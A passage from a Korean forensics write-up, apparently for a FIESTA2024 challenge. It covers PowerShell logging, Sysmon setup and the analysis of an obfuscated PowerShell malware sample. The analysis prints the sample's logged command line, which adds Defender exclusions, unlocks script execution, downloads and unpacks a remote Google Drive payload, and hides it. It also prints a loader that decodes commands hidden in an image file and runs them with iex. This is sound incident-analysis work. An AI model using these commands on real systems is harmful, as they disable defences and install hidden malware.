&lt;h3 id=&quot;232-powershell-로깅-설정-변경&quot;&gt;2.3.2. PowerShell 로깅 설정 변경&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;gpedit.msc라는 프로그램을 활용해 설정을 변경해줄 수도 있고&lt;/li&gt;
  &lt;li&gt;레지스트리 값을 변경해 원하는 설정을 적용할 수도 있고,&lt;/li&gt;
  &lt;li&gt;PowerShell conf file을 이용해 설정을 적용할 수도 있다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이 글에서는 gpedit.msc, 즉 Group Policy 응용을 활용해 설정을 변경해줄 것이다.&lt;/p&gt;

&lt;p&gt;이외 방법이 궁금하다면 &lt;a href=&quot;https://www.notion.so/250114_-_-_2-17bc244f77b480279aafcbe0575d2209?pvs=21&quot;&gt;여기&lt;/a&gt;로&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Windows 10, 11 home 버전에서는 gpedit.msc를 win+r로 검색해도 찾을 수 없을 것이다. 홈 에디션이라 그렇다.&lt;/p&gt;

&lt;p&gt;그럴 땐 아래의 배치를 분석 PC에서 관리자 권한으로 돌려주면 된다. 내부 커맨드를 보면 알겠지만 윈도우 패키지 프로그램으로 gpedit.msc를 설치하는 배치 파일이라 별다른 악성 행위는 하지 않는다. (보안하는 사람 특: 이런 거 보면 불안해서 뜯어봄)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/gpedit.bat&quot;&gt;gpedit.bat&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 win+r로 gpedit.msc를 실행하면 아래와 같은 창을 볼 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%204.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;컴퓨터 구성과 사용자 구성이 보인다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;둘의 하위 정책은 대부분 중복되지 않지만, 놀랍게도 이번에 수정할 파워쉘 정책은 중복된다.&lt;/p&gt;

&lt;p&gt;그럼 이 중 무엇을 선택해야 하나?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;결론: 컴퓨터 구성이 더 우선순위 높게 선택 적용된다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;컴퓨터 구성은 컴퓨터 부팅 시에, 사용자 구성은 사용자 로그인 시에 적용되기 때문이다.&lt;/p&gt;

&lt;p&gt;레지스트리 키 적용 시점 구분과 비슷한 걸 보니 레지스트리 키와 연관 있나 보다&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;는&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그렇네 생각해보니 여기에서 구성 변경하는 거랑 레지스트리 키 변경으로 구성 변경하는 거랑 똑같았지&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아무튼 다시 본론으로 돌아와서&lt;/p&gt;

&lt;p&gt;그렇다면 컴퓨터 구성에서 설정을 변경하는 편이 일 두 번 안 하고 좋을 것이다.&lt;/p&gt;

&lt;p&gt;gpedit.msc &amp;gt; 컴퓨터 구성 &amp;gt; 관리 템플릿 &amp;gt; Windows 구성 요소 &amp;gt; Windows PowerShell&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%205.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;여기에서 모듈 로깅, 스크립트 블록 로깅, PowerShell 기록 켜기를 True로 설정해줄 것이다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;모듈 로깅: 모듈 이름을 *로 명시해 줘야 모든 모듈의 활동이 기록될 것&lt;/li&gt;
  &lt;li&gt;PowerShell 기록: 기록 저장 디렉토리를 명시해주면 나중에 관리가 편할 것&lt;/li&gt;
  &lt;li&gt;스크립트 실행도 모든 스크립트에 대해 허용하도록 했다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 기본 설정이 완료되었다. 또한, 추가적으로 파일리스 악성코드의 활동을 분석하기 위해 필요한 방법을 소개한다.&lt;/p&gt;

&lt;p&gt;대체 언제 처음 소개했던 난독화된 쉘스크립트를 분석할 건지…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;233-sysmon을-활용한-백그라운드-동작-탐지&quot;&gt;2.3.3. Sysmon을 활용한 백그라운드 동작 탐지&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Sysmon은 Microsoft에서 배포하는 Sysinternals에 포함된 도구&lt;/li&gt;
  &lt;li&gt;Windows 로그에 기록되지 않거나 세부적으로 기록되지 않는 내용에 대해서 상세한 로그 기록을 위해 사용됨&lt;/li&gt;
  &lt;li&gt;윈도우 로그 경로에 Microsoft-Windows-Sysmon%4Operational.evtx 로그 파일이 생성되어 저장&lt;/li&gt;
  &lt;li&gt;그런데 기본 설정은 프로세스 생성 이벤트 수집만 하는 것이라, 특정 이벤트 및 해시를 포함한 로깅을 하고 싶다면 별도 설정 파일(xml)을 로드하여 실행해 줘야 한다.
    &lt;ul&gt;
      &lt;li&gt;모든 룰셋이 그렇듯 이것도 오픈 소스 룰셋이 있다. (https://github.com/SwiftOnSecurity/sysmon-config)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;설정만 제대로 한다면 백그라운드 동작도 캡쳐가 가능하다.
    &lt;ul&gt;
      &lt;li&gt;인젝션, 파일 생성, 레지스트리 조작 등…&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(출처: https://www.igloo.co.kr/security-information/powershell%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-%ED%8C%8C%EC%9D%BC%EB%A6%AC%EC%8A%A4-%EA%B3%B5%EA%B2%A9/)&lt;/p&gt;

&lt;p&gt;sysmon은 &lt;a href=&quot;https://learn.microsoft.com/ko-kr/sysinternals/downloads/sysmon&quot;&gt;ms 공식 홈페이지&lt;/a&gt;에서 다운로드할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-분석&quot;&gt;3. 분석&lt;/h1&gt;

&lt;p&gt;위 파워쉘 스크립트를 미리 문제 폴더에 powershell.ps1 파일로 저장해 두었다.&lt;/p&gt;

&lt;p&gt;이제 실행해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%206.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;800 파이프라인 실행 이벤트로 무언가 커맨드를 실행한 흔적이 남았다.&lt;/p&gt;

&lt;p&gt;상세 설명을 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;명령줄의 파이프라인 실행 세부 정보: Add-MpPreference -ExclusionPath &quot;C:\Windows\System32&quot;; $executionPolicyPath = &quot;HKLM:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell&quot;; $executionPolicyValue = &quot;Unrestricted&quot;; Set-ItemProperty -Path $executionPolicyPath -Name &quot;ExecutionPolicy&quot; -Value $executionPolicyValue; Add-Type -AssemblyName System.IO.Compression.FileSystem; function Test-InternetConnection { try { $request = [System.Net.WebRequest]::Create(&quot;http://www.google.com&quot;); $request.Timeout = 10000; $request.Method = &quot;HEAD&quot;; $response = $request.GetResponse(); $response.Close(); return $true } catch { return $false } }; function Create-BaseDirectory { $directoryPath = &quot;C:\Program Files\Microsoft Mail&quot;; if (!(Test-Path -Path $directoryPath)) { New-Item -Force -ItemType directory -Path $directoryPath; Write-Output &quot;[+] Base Directory Created&quot; } else { Write-Output &quot;[!] Base Directory Already Exists&quot; }; Add-MpPreference -ExclusionPath &quot;C:\Program Files\Microsoft Mail&quot; }; function Download-File { $url1 = &quot;https://www.7-zip.org/a/7z2401-x64.exe&quot;; $dest1 = &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; $url2 = &quot;https://drive.usercontent.google.com/u/0/uc?id=1OvkcHZnQd91akAGdaQLNWU_HxjNvv9Hl&amp;amp;export=download&quot;; $dest2 = &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; $client = New-Object System.net.webclient; $client.DownloadFile($url1, $dest1); $client.DownloadFile($url2, $dest2); Write-Output &quot;[+] Success Download&quot; }; function PWUnzip { $install7z = &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; $zipFilePath = &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; $7zipPath = &quot;C:\Program Files\7-Zip\7z.exe&quot;; Start-Process $install7z /S -Wait -PassThru; &amp;amp; $7zipPath x $zipFilePath -y; mv rc &quot;C:\Program Files\Microsoft Mail\&quot; }; function Hide-Action { Remove-Item -Path &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; Remove-Item -Path &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; Remove-Item -Path &quot;C:\Users\torden\Downloads\mail helper.zip&quot;; Remove-Item -Recurse -Path &quot;C:\Users\torden\Downloads\mail helper&quot;; $End_Task = Get-Item &quot;C:\Program Files\Microsoft Mail\&quot; -Force; $End_Task.Attributes = &quot;Hidden&quot;; Write-Output &quot;[+] Success Hidden_Action&quot; }; Create-BaseDirectory; if (Test-InternetConnection) { Download-File; PWUnzip; Hide-Action }; cd &quot;C:\Program Files\Microsoft Mail\rc&quot;; &amp;amp; &quot;.\system.ps1&quot;                . 

컨텍스트 정보: 
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=19

	UserId=DESKTOP-UAR1ODI\horim
	HostName=ConsoleHost
	HostVersion=5.1.19041.5369
	HostId=a5338884-9dff-4c76-958e-23188077e040
	HostApplication=powershell
	EngineVersion=5.1.19041.5369
	RunspaceId=511f0e7c-7646-4dcd-8b44-b99961f93057
	PipelineId=20
	ScriptName=
	CommandLine=Add-MpPreference -ExclusionPath &quot;C:\Windows\System32&quot;; $executionPolicyPath = &quot;HKLM:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell&quot;; $executionPolicyValue = &quot;Unrestricted&quot;; Set-ItemProperty -Path $executionPolicyPath -Name &quot;ExecutionPolicy&quot; -Value $executionPolicyValue; Add-Type -AssemblyName System.IO.Compression.FileSystem; function Test-InternetConnection { try { $request = [System.Net.WebRequest]::Create(&quot;http://www.google.com&quot;); $request.Timeout = 10000; $request.Method = &quot;HEAD&quot;; $response = $request.GetResponse(); $response.Close(); return $true } catch { return $false } }; function Create-BaseDirectory { $directoryPath = &quot;C:\Program Files\Microsoft Mail&quot;; if (!(Test-Path -Path $directoryPath)) { New-Item -Force -ItemType directory -Path $directoryPath; Write-Output &quot;[+] Base Directory Created&quot; } else { Write-Output &quot;[!] Base Directory Already Exists&quot; }; Add-MpPreference -ExclusionPath &quot;C:\Program Files\Microsoft Mail&quot; }; function Download-File { $url1 = &quot;https://www.7-zip.org/a/7z2401-x64.exe&quot;; $dest1 = &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; $url2 = &quot;https://drive.usercontent.google.com/u/0/uc?id=1OvkcHZnQd91akAGdaQLNWU_HxjNvv9Hl&amp;amp;export=download&quot;; $dest2 = &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; $client = New-Object System.net.webclient; $client.DownloadFile($url1, $dest1); $client.DownloadFile($url2, $dest2); Write-Output &quot;[+] Success Download&quot; }; function PWUnzip { $install7z = &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; $zipFilePath = &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; $7zipPath = &quot;C:\Program Files\7-Zip\7z.exe&quot;; Start-Process $install7z /S -Wait -PassThru; &amp;amp; $7zipPath x $zipFilePath -y; mv rc &quot;C:\Program Files\Microsoft Mail\&quot; }; function Hide-Action { Remove-Item -Path &quot;C:\Program Files\Microsoft Mail\mail.zip&quot;; Remove-Item -Path &quot;C:\Program Files\Microsoft Mail\7z.exe&quot;; Remove-Item -Path &quot;C:\Users\torden\Downloads\mail helper.zip&quot;; Remove-Item -Recurse -Path &quot;C:\Users\torden\Downloads\mail helper&quot;; $End_Task = Get-Item &quot;C:\Program Files\Microsoft Mail\&quot; -Force; $End_Task.Attributes = &quot;Hidden&quot;; Write-Output &quot;[+] Success Hidden_Action&quot; }; Create-BaseDirectory; if (Test-InternetConnection) { Download-File; PWUnzip; Hide-Action }; cd &quot;C:\Program Files\Microsoft Mail\rc&quot;; &amp;amp; &quot;.\system.ps1&quot;                 

세부 정보: 
CommandInvocation(Add-Type): &quot;Add-Type&quot;
매개 변수 바인딩(Add-Type): 이름=&quot;AssemblyName&quot;; 값=&quot;System.IO.Compression.FileSystem&quot;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;HostApplication=Powershell인 것으로 보아, 내가 실행한 powershell.ps1 스크립트에서 새로운 PowerShell을 띄우고 그 인자로(pipe를 통해 전달) CommandLine을 전달한 것 같다.&lt;/p&gt;

&lt;p&gt;즉, 내가 실행한 스크립트는 위의 CommandLine을 디코딩해 실행하는 스크립트이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그러나 완전 빅 프라블럼&lt;/p&gt;

&lt;p&gt;나는 powershell.ps1의 난독화를 해제하고 싶은 건데……. 스스로를 복호화해 실행하는 그런 건 아닌 것 같다….&lt;/p&gt;

&lt;p&gt;수제로 난독화를 해제하기로 했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$var10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Guide.dib&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_fileData&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.IO.File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decoded_data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Collections.ArrayList&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18304&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-bor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_fileData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decoded_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decoded_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# iex는 문자열을 명령어로서 실행하는 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 문자열 출력부&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var24&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MA==(0)&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var26&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var27&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UG93ZXJTaGVsbA==(PowerShell)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
